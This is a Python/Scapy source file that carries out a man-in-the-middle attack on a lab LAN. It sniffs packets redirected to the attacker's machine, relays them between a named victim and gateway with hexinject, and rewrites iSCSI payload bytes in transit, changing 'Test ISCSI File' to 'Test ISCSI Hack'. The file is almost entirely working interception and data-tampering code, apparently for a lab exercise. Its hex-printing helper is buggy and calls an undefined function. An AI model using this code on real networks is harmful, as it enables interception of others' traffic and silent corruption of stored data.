#!/etc/usr/python

from scapy.all import *
import sys

iface = "eth0"
filter = "ip"
#victim in this case is the initiator
VICTIM_IP = "192.168.1.167"
MY_IP = "192.168.1.170"
# gateway is the target
GATEWAY_IP = "192.168.1.168"
#VICTIM_MAC = "### don't want so show###"
MY_MAC = "08:00:27:f2:ee:7c"
#target mac address
GATEWAY_MAC = "08:00:27:60:74:b2"
#initiator mac address
VICTIM_MAC = "08:00:27:b9:c9:b9" 


def hex_packet(packet):
    x=str(packet)
    l=len(x)
    i =0
    while i < l:
        print "%04x  " % i,
        for j in range(16):
            if i+j < 1:
                print "%02X" % ord(x[i+j]),
            else:
                print "  ",
            if j%16 == 7:
                print "",
        print " ",
        print sane_color(x[i:i+16])
        i += 16

def parse_to_hex(packet):
    # lines below are to redirect hexdump to a file so that we can use in the python script again
    stdout = sys.stdout
    sys.stdout = open('packet.txt', 'w')
    hexdump(packet)
    sys.stdout.close()
    sys.stdout = stdout
    packet_str = open('packet.txt', 'r')
    packet_hex = ''
    #trimming the hexadecimal packet to get only the hexadecimal content
    for line in packet_str:
        #print "packet line" + line
        hexline = line.split('   ')[1]
        hexline = hexline.replace('  ', ' ')
        packet_hex = packet_hex + ' ' + hexline
    packet_str.close()
    packet_hex = packet_hex.strip()
    return packet_hex

def handle_packet(packet):
    if (packet[IP].dst == GATEWAY_IP) and (packet[Ether].dst == MY_MAC):
        # we change the packet destination to the target machine
        packet[Ether].dst = GATEWAY_MAC
        #if(packet[IP].proto == "tcp"):
        packet_hex = parse_to_hex(packet)
        print packet_hex
        if ('54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65' in packet_hex):
            packet_hex = packet_hex.replace("54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65", "54 65 73 74 20 49 53 43 53 49 20 48 61 63 6B")
            #packet_file = open('packet', 'w')
            #packet_file.write(packet_read)
            os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
        else:
            #print "hex injected"
            os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
            #print "A tcp packet from " + packet[IP].src + " redirected!"
    elif (packet[IP].dst == VICTIM_IP) and (packet[Ether].dst == MY_MAC):
        # we change the packet destination to the initiator machine
        packet[Ether].dst = VICTIM_MAC
        #if(packet[IP].proto == "tcp"):
        packet_hex = parse_to_hex(packet)
        print packet_hex
        os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
sniff(prn=handle_packet, filter=filter, iface=iface, count=0)